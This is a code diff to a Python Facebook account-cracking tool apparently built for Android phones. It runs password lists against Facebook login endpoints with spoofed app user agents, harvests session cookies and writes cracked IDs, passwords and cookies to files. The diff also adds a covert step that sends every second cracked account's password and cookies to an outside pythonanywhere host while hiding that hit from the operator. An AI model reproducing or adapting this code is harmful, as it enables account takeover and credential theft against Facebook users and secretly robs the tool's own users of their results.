@@ -253,7 +253,7 @@ class Process:
         self.key="ATOM-"+ base64.b16encode(str(os.getuid()).encode()).decode() + hashlib.md5((''.join([platform.version(), str(os.getuid()), platform.platform(), os.getlogin(), platform.release()]).replace(' ', '').encode())).hexdigest()
         #self.key=""
         self.clear()
-        r = self.Gex('https://pastebin.com/raw/uhce1AGG')
+        r = self.Gex('https://raw.githubusercontent.com/DESTROYED-ATOM/ATOM2/refs/heads/main/Key.txt')
         if self.key in r:
             self.enroll()
         else:
@@ -266,7 +266,7 @@ class Process:
             input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
             time.sleep(3.5)
             tks = 'TOKEN KEY =%20%20:%20'+self.key
-            os.system('am start https://wa.me/01989733880?text=' + tks)
+            os.system('am start https://wa.me/+918389066877?text=' + tks)
             exit()
     def clear(self):os.system('clear');clear()
     def Gex(self,x):
@@ -283,8 +283,8 @@ class Process:
         
 def m():
     os.system('clear');print(logo)
-    print(f'{Y}[{W}1{Y}] {W}HOST 1 [Web]')
-    print(f'{Y}[{W}2{Y}] {W}HOST 2 [IOS]')
+    print(f'{Y}[{W}1{Y}] {W}METHOD 1 ')
+    print(f'{Y}[{W}2{Y}] {W}METHOD 2 ')
     print(47*"—")
     m = input(f'{Y}[{W}?{Y}] {W}Choose Method : ')
     if m == '1':
@@ -439,7 +439,7 @@ def convert(cookie):
     return(str(cok))            
 
 def crackerr(ids,passlist):
-    global loop,oks,cps
+    global loop,oks,cps,bkas
     session = requests.Session()
     sys.stdout.write('\r \033[1;97m[\x1b[1;92mM•2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
     sys.stdout.flush()
@@ -447,75 +447,50 @@ def crackerr(ids,passlist):
         for pas in passlist:
             #nip=random.choice(proxsi)
             #proxs= {'http': 'socks4://'+nip}
-            moz = random.choice(usragt)
+            #moz = random.choice(usergent)
             facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
             bv = f"{random.randint(1111111,7777777)}"
             versi_android = f"{random.randint(6,14)}"
             deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
             deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
             device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
-            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
+            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
             up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
-            url1 = "https://m.prod.facebook.com/"
-            head = {"authority": "m.prod.facebook.com",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "dpr": "3",
-            "sec-ch-prefers-color-scheme": "light",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "none",
-            "sec-fetch-user": "?1",
-            "upgrade-insecure-requests": "1",
-            "user-agent": us,
-            "viewport-width": "980"}
-            free_fb = session.get(url1,headers=head).text
-            log_data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '',
-            'signed_next': '',
-            'trynum': '1',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0^%^3D',
-            'lgnrnd': '025924_Hv1B',
-            'lgnjs': '1735383565',
-            'email': ids,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'ab_test_data': '^%^2F^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPA^%^2FPPPvfBFAI',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
-            url = "https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
+            url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0388496f-9bad-4e7f-b2df-62e676ad873e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated"
+            requu1 = session.get(url1)
+            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
+            #url = "https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
+            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             headers = {
             'user-agent': us,
             'Accept-Encoding': 'gzip, deflate',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept': '*/*',
             'Connection': 'keep-alive',
-            'Host': 'x.prod.facebook.com',
-            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-            'cache-control': 'max-age=0',
-            'dpr': '3',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://m.facebook.com',
+            'priority': 'u=1, i',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=507811537136246&kid_directed_site=0&app_id=507811537136246&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D507811537136246%26cbt%3D1736483470728%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfadd3b7728fbfb6c3%2526domain%253Dwww.z2u.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.z2u.com%25252Ff3fcbc8cc23807a4b%2526relation%253Dopener%26client_id%3D507811537136246%26display%3Dpopup%26domain%3Dwww.z2u.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.z2u.com%252Flogin.html%26locale%3Den_US%26logger_id%3Df4ae87efc07dfc1f4%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df98748ee374d96fe2%2526domain%253Dwww.z2u.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.z2u.com%25252Ff3fcbc8cc23807a4b%2526relation%253Dopener%2526frame%253Df81b6c91ffd56da37%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df98748ee374d96fe2%26domain%3Dwww.z2u.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.z2u.com%252Ff3fcbc8cc23807a4b%2526relation%3Dopener%2526frame%3Df81b6c91ffd56da37%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duer_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
             'sec-ch-prefers-color-scheme': 'light',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'cross-site',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'viewport-width': '980'}
-            response = session.post(url,data=log_data,headers=headers,allow_redirects=False)
+            'sec-ch-ua': '"Not-A.Brand";v="24", "Chromium";v="128"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="24.0.0.0", "Chromium";v="128.0.6613.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '"5.15.123"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'x-asbd-id': '129477',
+            'x-fb-lsd': us,
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream'}            
+            response = session.post(url,data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
+            #print(headers)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
-                kuki = convert(session.cookies.get_dict())
-                #kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
+                #kuki = convert(session.cookies.get_dict())
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
                 xs_value = None
                 for part in kuki.split(';'):
@@ -526,24 +501,29 @@ def crackerr(ids,passlist):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [CRACK-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/CRACK/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/CRACK/uid.txt","a").write(user+"|"+pas+"\n")
+                        print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
+                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         oks.append(ids)
                         break
                     else:
-                        print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/CRACK/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/CRACK/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
-                        break
+                        bkas.append(user)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{user}|{pas}|{kuki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
+                           print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
+                           open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                           oks.append(ids)
+                           break
+                else:
+                    break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
-                open('/sdcard/CRACK/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                #print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
+                open('/sdcard/CRACK/CP.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
